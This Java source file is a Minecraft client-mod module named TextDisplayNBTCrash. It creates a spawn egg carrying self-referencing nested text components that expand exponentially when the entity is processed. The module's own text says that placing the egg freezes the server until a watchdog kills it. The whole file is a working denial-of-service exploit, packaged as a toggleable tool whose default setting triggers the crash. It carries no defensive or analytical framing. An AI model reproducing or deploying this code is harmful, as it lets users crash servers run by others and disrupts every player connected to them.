package pwn.noobs.trouserstreak.modules;

import meteordevelopment.meteorclient.settings.*;
import meteordevelopment.meteorclient.systems.modules.Module;
import net.minecraft.component.DataComponentTypes;
import net.minecraft.component.type.NbtComponent;
import net.minecraft.entity.EntityType;
import net.minecraft.item.ItemStack;
import net.minecraft.item.Items;
import net.minecraft.nbt.NbtCompound;
import net.minecraft.registry.Registries;
import net.minecraft.screen.slot.SlotActionType;
import net.minecraft.text.Text;
import net.minecraft.util.Formatting;
import net.minecraft.util.Identifier;
import pwn.noobs.trouserstreak.Trouser;

/**
 * TextDisplayNBTCrash —— Minimize the trigger test: Give a spawn egg with recursive text {@code text_display}.
 *
 * <p>The spawn eggs are data-driven: `{@code getType()}` directly reads `{@code entity_data.id}`, so any egg can spawn any entity; only the creative mode is needed.
 * Placing an egg will freeze the server (the watchdog will force-kill it after about 60 seconds).
 *
 * <p>{@code bomb width} = number of self-references in {@code CustomName}: 1 linear (safe, only 100 levels), 2 exponential (shutdown).
 */
public class TextDisplayNBTCrash extends Module {

    private final SettingGroup sg = settings.getDefaultGroup();

    private final Setting<Integer> width = sg.add(new IntSetting.Builder()
            .name("#-self-references")
            .description("The number of self-references in CustomName. 1 = linear (safe), 2 = exponential (shutdown), the larger the value, the faster.")
            .defaultValue(2)
            .min(1)
            .max(8)
            .sliderMax(4)
            .build());
    private final Setting<String> nom = sg.add(new StringSetting.Builder()
            .name("Custom Name")
            .description("Name the Thing")
            .defaultValue("MOUNTAINSOFLAVAINC")
            .build());
    private final Setting<ColorModes> nomcolor = sg.add(new EnumSetting.Builder<ColorModes>()
            .name("Custom Name Color")
            .description("Color the Name")
            .defaultValue(ColorModes.red)
            .build());
    private enum ColorModes { aqua, black, blue, dark_aqua, dark_blue, dark_gray, dark_green, dark_purple, dark_red, gold, gray, green, italic, light_purple, red, white, yellow }

    public TextDisplayNBTCrash() {
        super(Trouser.operator, "TextDisplayNBTCrash", "Creates a text_display spawn egg that uses self-referencing nested text components to trigger exponential expansion when the entity is processed. This crashes servers.");
    }

    @Override
    public void onActivate() {
        if (mc.player == null || mc.getNetworkHandler() == null) {
            error("Not connected.");
            toggle();
            return;
        }

        if (!mc.player.isInCreativeMode()) {
            error("You need creative mode.");
            toggle();
            return;
        }

        EntityType<?> type = Registries.ENTITY_TYPE
                .get(Identifier.tryParse("minecraft:text_display"));
        if (type == null) {
            error("text_display identifier cannot be found.");
            toggle();
            return;
        }

        NbtCompound root = new NbtCompound();
        root.putString("id", "minecraft:text_display");
        root.putString("CustomName", bombNameJson(width.get()));
        root.putString("text", "{\"nbt\":\"CustomName\",\"entity\":\"@s\",\"interpret\":true}");
        ItemStack stack = new ItemStack(Items.ZOMBIE_SPAWN_EGG);
        stack.set(DataComponentTypes.ENTITY_DATA, NbtComponent.of(root));
        stack.set(DataComponentTypes.CUSTOM_NAME, Text.literal(nom.get()).formatted(Formatting.valueOf(nomcolor.get().toString().toUpperCase())));

        int slot = 36 + mc.player.getInventory().selectedSlot;
        mc.interactionManager.clickCreativeStack(stack,slot);
        //clickSlot twice to make the item actually appear clientside
        mc.interactionManager.clickSlot(mc.player.currentScreenHandler.syncId, slot, 0, SlotActionType.PICKUP, mc.player);
        mc.interactionManager.clickSlot(mc.player.currentScreenHandler.syncId, slot, 0, SlotActionType.PICKUP, mc.player);

        warning("This has been added to the hotbar (width %d). Right-clicking on a block will cause the server to shut down.", width.get());
    }

    private String bombNameJson(int n) {
        StringBuilder refs = new StringBuilder();

        for (int i = 0; i < n; i++) {
            if (!refs.isEmpty()) {
                refs.append(',');
            }
            refs.append("{\"nbt\":\"CustomName\",\"entity\":\"@s\",\"interpret\":true}");
        }

        return "{\"text\":\"X\",\"extra\":[" + refs + "]}";
    }
}